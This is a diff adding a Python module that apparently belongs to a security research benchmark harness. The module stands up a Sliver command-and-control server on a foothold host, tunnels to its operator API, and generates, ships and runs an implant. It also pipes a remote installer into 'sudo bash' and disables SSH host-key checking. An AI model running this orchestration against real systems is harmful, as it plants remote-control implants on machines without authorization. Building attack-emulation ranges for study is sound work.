@@ -1,0 +1,237 @@
+"""Sliver C2 lifecycle — the Sliver analog of incalmo/c2.py. Stands a Sliver server up ON THE FOOTHOLD
+(installed self-contained at setup), opens an ssh -L tunnel so the harness reaches the operator gRPC,
+starts an mTLS listener, generates + lands a session-mode implant, and waits for its session. Teardown
+is keyed by experiment_name (statefile), like c2.py — no persisted C2 handle.
+
+Split by trust/venv:
+  * This module runs in the MANAGER process (harness venv). It does the SSH/subprocess work (install,
+    daemon, tunnel, deliver+run the implant) and reads/writes state. It holds NO sliver-py import.
+  * All sliver-py (operator gRPC client) work lives in _sliver_ops.py, run under the dedicated sliver
+    venv (cfg.get_sliver_python()), because the manager venv has no sliver-py. setup_c2 shells out to it.
+
+Reaches the foothold ONLY through the env-provided SetupAccess (scoped key + bastion routing) — no
+management key off disk, same contract as c2.py / foothold.py.
+
+NOT LIVE-VALIDATED. The SSH/orchestration shape here is solid, but the exact sliver-server CLI flags,
+the sliver-py calls in _sliver_ops.py, and mTLS-over-the-tunnel all need a pass against an installed
+Sliver before this is trusted. Points that need it are marked `VALIDATE:`.
+"""
+from __future__ import annotations
+
+import asyncio
+import json
+import os
+import shlex
+import signal
+import subprocess
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Optional
+
+from ...env_spec import SetupAccess
+from ..base import PreparedAttacker
+
+_STATE_DIR = Path("/tmp/mhbench-sliver-c2")
+_GRPC_PORT = 31337   # sliver operator gRPC (on the foothold); reached from the harness via the tunnel
+_LISTENER_PORT = 8443  # mTLS C2 listener on the foothold; victims session in here (VALIDATE: env firewall)
+_SLIVER_INSTALL = "https://sliver.sh/install"  # official installer; setup runs it on the foothold
+
+
+@dataclass
+class SliverPreparedC2(PreparedAttacker):
+    """Sliver setup() output, carried on the opaque baton for the plugin's OWN build_config()/run().
+    The arena never inspects it."""
+    operator_cfg: Optional[str] = None   # harness-side path to the operator config (rewritten to the tunnel)
+    listener_addr: Optional[str] = None  # the foothold's in-env listener address victims session to
+    control_port: Optional[int] = None   # local tunnel port the operator gRPC is reachable on (127.0.0.1:<port>)
+
+
+def _statefile(experiment_name: str) -> Path:
+    return _STATE_DIR / f"{experiment_name}.json"
+
+
+def _ssh(access: SetupAccess) -> list[str]:
+    """ssh argv to the foothold over the env-provided SetupAccess (scoped key + bastion routing).
+    Mirrors c2.py's _ssh_to_foothold — routing is opaque in access.ssh_common_args."""
+    args = ["ssh"]
+    if access.ssh_key:
+        args += ["-i", os.path.expanduser(access.ssh_key)]
+    args += ["-p", str(access.port), "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
+             "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15",
+             "-o", "ServerAliveInterval=30", "-o", "ServerAliveCountMax=3"]
+    if access.ssh_common_args:
+        args += shlex.split(access.ssh_common_args)
+    args += [f"{access.user}@{access.host}"]
+    return args
+
+
+async def _ssh_run(access: SetupAccess, remote_cmd: str, timeout: int = 600) -> tuple[int, str]:
+    proc = await asyncio.create_subprocess_exec(
+        *_ssh(access), remote_cmd,
+        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
+    try:
+        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+    except asyncio.TimeoutError:
+        proc.kill()
+        return 124, "timeout"
+    return proc.returncode, out.decode("utf-8", "replace")
+
+
+def _free_local_port() -> int:
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.bind(("127.0.0.1", 0))
+        return s.getsockname()[1]
+    finally:
+        s.close()
+
+
+async def _run_sliver_ops(cfg, subcmd: str, args: list[str], timeout: int = 300) -> tuple[int, str]:
+    """Run _sliver_ops.py under the dedicated sliver venv (it has sliver-py; the manager venv does not).
+    Returns (returncode, stdout)."""
+    helper = Path(__file__).parent / "_sliver_ops.py"
+    proc = await asyncio.create_subprocess_exec(
+        str(cfg.get_sliver_python()), str(helper), subcmd, *args,
+        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
+    try:
+        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+    except asyncio.TimeoutError:
+        proc.kill()
+        return 124, "timeout"
+    return proc.returncode, out.decode("utf-8", "replace")
+
+
+async def setup_c2(experiment_name: str, cfg, access: SetupAccess, mgmt_ip: Optional[str] = None) -> SliverPreparedC2:
+    """Bring the Sliver C2 up on the foothold and return once the initial session is in. Raises on
+    failure (the plugin tears down a partial C2 via teardown_c2)."""
+    if access is None or not access.host:
+        raise RuntimeError(f"[sliver-c2] need a foothold SetupAccess with a host (got {access!r})")
+    _STATE_DIR.mkdir(parents=True, exist_ok=True)
+    foothold = access.host
+    work = _STATE_DIR / experiment_name
+    work.mkdir(parents=True, exist_ok=True)
+
+    # 1. Install sliver-server on the foothold (self-contained; idempotent). VALIDATE: the one-liner
+    #    installer footprint + that `sliver-server` lands on PATH; a fresh victim-range foothold has
+    #    apt egress (same assumption as c2.py's docker install).
+    rc, out = await _ssh_run(access,
+        "command -v sliver-server >/dev/null || (curl -fsSL %s | sudo bash)" % shlex.quote(_SLIVER_INSTALL),
+        timeout=900)
+    if rc != 0:
+        raise RuntimeError(f"[sliver-c2] sliver-server install on foothold failed (rc={rc}): {out[-500:]}")
+
+    # 2. Start the sliver-server daemon (operator gRPC up on :31337). VALIDATE: daemon flags / unit name.
+    await _ssh_run(access,
+        "pgrep -f 'sliver-server daemon' >/dev/null || "
+        "(setsid sliver-server daemon >/var/log/sliver-server.log 2>&1 < /dev/null &)", timeout=120)
+
+    # 3. Generate an operator config on the foothold and pull it back. VALIDATE: exact `operator` flags
+    #    + that --lhost 127.0.0.1 is accepted (we connect via the tunnel, so the config must point local).
+    await _ssh_run(access,
+        "sliver-server operator --name op --lhost 127.0.0.1 --save /tmp/op.cfg && cat /tmp/op.cfg",
+        timeout=120)
+    rc, cfg_text = await _ssh_run(access, "cat /tmp/op.cfg", timeout=60)
+    if rc != 0 or not cfg_text.strip().startswith("{"):
+        raise RuntimeError(f"[sliver-c2] could not read operator config from foothold: {cfg_text[-300:]}")
+    operator_cfg = work / "operator.cfg"
+
+    # 4. Open the harness->foothold tunnel for the operator gRPC (foothold has no FIP). Rewrite the
+    #    operator config's port to the local tunnel port so the client connects through it.
+    #    VALIDATE: mTLS — the server cert is issued for the foothold; connecting to 127.0.0.1:<lport>
+    #    must still validate (CA-based). If sliver-py enforces hostname, the config/cert needs a SAN or
+    #    an InsecureSkipVerify-equivalent; this is the single riskiest point of the integration.
+    local_port = _free_local_port()
+    cfg_json = json.loads(cfg_text)
+    cfg_json["lport"] = local_port
+    cfg_json["lhost"] = "127.0.0.1"
+    operator_cfg.write_text(json.dumps(cfg_json))
+    tunnel = _open_tunnel(access, local_port, _GRPC_PORT)
+
+    try:
+        # 5. Via sliver-py (the helper, under the sliver venv): start the mTLS listener on the foothold
+        #    and generate a session-mode implant, saved locally. VALIDATE: _sliver_ops.provision.
+        implant = work / "implant"
+        rc, out = await _run_sliver_ops(cfg, "provision", [
+            "--cfg", str(operator_cfg), "--listener-host", foothold,
+            "--listener-port", str(_LISTENER_PORT), "--out", str(implant)], timeout=600)
+        if rc != 0:
+            raise RuntimeError(f"[sliver-c2] implant/listener provision failed (rc={rc}): {out[-600:]}")
+
+        # 6. Ship + run the implant on the foothold (initial session). VALIDATE: exec/backgrounding.
+        with open(implant, "rb") as f:
+            put = await asyncio.create_subprocess_exec(
+                *_ssh(access), "cat > /tmp/implant && chmod +x /tmp/implant",
+                stdin=f, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.PIPE)
+            await put.communicate()
+        await _ssh_run(access, "setsid /tmp/implant >/dev/null 2>&1 < /dev/null &", timeout=60)
+
+        # 7. Wait for the initial session to register. VALIDATE: _sliver_ops.wait.
+        rc, out = await _run_sliver_ops(cfg, "wait", ["--cfg", str(operator_cfg), "--timeout", "180"], timeout=240)
+        if rc != 0:
+            raise RuntimeError(f"[sliver-c2] no Sliver session beaconed in: {out[-400:]}")
+    except Exception:
+        _kill_pid(tunnel.pid)
+        raise
+
+    _statefile(experiment_name).write_text(json.dumps({
+        "tunnel_pid": tunnel.pid, "foothold": foothold, "local_port": local_port,
+        "access": access.model_dump(),  # teardown reaches the foothold with the same scoped reach
+    }))
+    listener_addr = f"{foothold}:{_LISTENER_PORT}"
+    return SliverPreparedC2(operator_cfg=str(operator_cfg), listener_addr=listener_addr, control_port=local_port)
+
+
+def _open_tunnel(access: SetupAccess, local_port: int, remote_port: int) -> subprocess.Popen:
+    """Resilient ssh -L 127.0.0.1:<local_port> -> 127.0.0.1:<remote_port> on the foothold, through the
+    bastion. Supervised auto-reconnect, same shape as c2.py's tunnel."""
+    ssh_tunnel = ["ssh", "-N", "-o", "ExitOnForwardFailure=yes", "-o", "ServerAliveInterval=30",
+                  "-o", "ServerAliveCountMax=6", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
+                  "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "-p", str(access.port)]
+    if access.ssh_key:
+        ssh_tunnel += ["-i", os.path.expanduser(access.ssh_key)]
+    if access.ssh_common_args:
+        ssh_tunnel += shlex.split(access.ssh_common_args)
+    ssh_tunnel += ["-L", f"127.0.0.1:{local_port}:127.0.0.1:{remote_port}", f"{access.user}@{access.host}"]
+    supervisor = "while true; do " + " ".join(shlex.quote(a) for a in ssh_tunnel) + "; sleep 2; done"
+    return subprocess.Popen(["bash", "-c", supervisor], stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL, start_new_session=True)
+
+
+def _kill_pid(pid: int) -> None:
+    for sig in (signal.SIGTERM, signal.SIGKILL):
+        try:
+            os.killpg(os.getpgid(pid), sig)
+        except ProcessLookupError:
+            return
+        except Exception:
+            try:
+                os.kill(pid, sig)
+            except Exception:
+                return
+
+
+def teardown_c2(experiment_name: str, cfg=None) -> None:
+    """Kill the tunnel + stop the Sliver server/implant on the foothold. Keyed by experiment_name.
+    Never raises. Sync (called via run_in_executor from the async stop path)."""
+    sf = _statefile(experiment_name)
+    try:
+        state = json.loads(sf.read_text())
+    except Exception:
+        return
+    pid = state.get("tunnel_pid")
+    if isinstance(pid, int):
+        _kill_pid(pid)
+    acc = state.get("access")
+    if acc:
+        try:
+            access = SetupAccess.model_validate(acc)
+            subprocess.run(_ssh(access) + [
+                "pkill -f 'sliver-server daemon'; pkill -f /tmp/implant; rm -f /tmp/implant /tmp/op.cfg || true"],
+                timeout=120, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+    try:
+        sf.unlink()
+    except Exception:
+        pass
